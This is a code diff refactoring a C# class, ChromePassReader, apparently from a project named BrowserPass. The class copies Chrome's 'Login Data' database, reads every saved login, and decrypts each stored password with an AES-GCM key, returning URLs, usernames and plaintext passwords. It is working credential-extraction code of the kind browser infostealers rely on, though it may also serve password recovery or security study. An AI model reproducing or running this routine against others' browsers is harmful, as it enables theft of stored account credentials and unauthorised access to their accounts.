@@ -1,89 +1,86 @@
-﻿using System;
+﻿using System.Collections.Generic;
+using System.Data;
 using System.Data.SQLite;
-using System.Text;
 using System.IO;
-using System.Security.Cryptography;
-using System.Collections.Generic;
 
 namespace BrowserPass
 {
     /// <summary>
-    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
+    ///     http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
     /// </summary>
-    class ChromePassReader : IPassReader
+    internal class ChromePassReader : IPassReader
     {
-        public string BrowserName { get { return "Chrome"; } }
+        private readonly string _loginDataPath;
 
-        private const string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+        public ChromePassReader(FileSystemInfo dataFolder, string profileFolderName)
+        {
+            DataFolder = dataFolder ?? new DirectoryInfo(Path.Combine(Helper.AppData.FullName, @"..\Local\Google\Chrome\User Data"));
+            ProfileFolderName = profileFolderName ?? "Default";
+            _loginDataPath = Path.Combine(DataFolder.FullName, ProfileFolderName, @"Login Data");
+        }
 
-        
+        public FileSystemInfo DataFolder { get; }
+        public string ProfileFolderName { get; }
+        public string BrowserName => "Chrome";
+
+
         public IEnumerable<CredentialModel> ReadPasswords()
         {
             var result = new List<CredentialModel>();
 
-            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
-            var p = Path.GetFullPath(appdata + LOGIN_DATA_PATH);
-
-            if (File.Exists(p))
+            if (!File.Exists(_loginDataPath)) throw new FileNotFoundException(_loginDataPath);
+            var cloned = _loginDataPath + ".copied";
+            File.Copy(_loginDataPath,cloned);
+            using (var conn = new SQLiteConnection($"Data Source={cloned};"))
             {
-                using (var conn = new SQLiteConnection($"Data Source={p};"))
+                conn.Open();
+                using (var cmd = conn.CreateCommand())
                 {
-                    conn.Open();
-                    using (var cmd = conn.CreateCommand())
+                    cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
+                    using (var reader = cmd.ExecuteReader())
                     {
-                        cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
-                        using (var reader = cmd.ExecuteReader())
+                        if (reader.HasRows)
                         {
-                            
-                            if (reader.HasRows)
+                            var key = GcDecryptor.GetKey();
+                            while (reader.Read())
                             {
-                                var key = GCDecryptor.GetKey();
-                                while (reader.Read())
-                                {
-                                    byte[] nonce, ciphertextTag;
-                                    var encryptedData = GetBytes(reader, 2);
-                                    GCDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
-                                    var pass = GCDecryptor.Decrypt(ciphertextTag, key, nonce);
+                                var encryptedData = GetBytes(reader, 2);
+                                GcDecryptor.Prepare(encryptedData, out var nonce, out var ciphertextTag);
+                                var pass = GcDecryptor.Decrypt(ciphertextTag, key, nonce);
 
-                                    result.Add(new CredentialModel()
-                                               {
-                                                   Url = reader.GetString(0),
-                                                   Username = reader.GetString(1),
-                                                   Password = pass
-                                               });
-                                }
+                                result.Add(new CredentialModel
+                                {
+                                    Url = reader.GetString(0),
+                                    Username = reader.GetString(1),
+                                    Password = pass
+                                });
                             }
-                        }                            
+                        }
                     }
-                    conn.Close();
                 }
 
+                conn.Close();
             }
-            else
-            {
-                throw new FileNotFoundException("Canno find chrome logins file");
-            }
+            File.Delete(cloned);
             return result;
         }
 
-        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
+        private static byte[] GetBytes(IDataRecord reader, int columnIndex)
         {
-            const int CHUNK_SIZE = 2 * 1024;
-            byte[] buffer = new byte[CHUNK_SIZE];
-            long bytesRead;
+            const int chunkSize = 2 * 1024;
+            var buffer = new byte[chunkSize];
             long fieldOffset = 0;
-            using (MemoryStream stream = new MemoryStream())
+            using (var stream = new MemoryStream())
             {
+                long bytesRead;
                 while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                 {
-                    stream.Write(buffer, 0, (int)bytesRead);
+                    stream.Write(buffer, 0, (int) bytesRead);
                     fieldOffset += bytesRead;
                 }
+
                 return stream.ToArray();
             }
-        }        
+        }
     }
-
-
-
 }
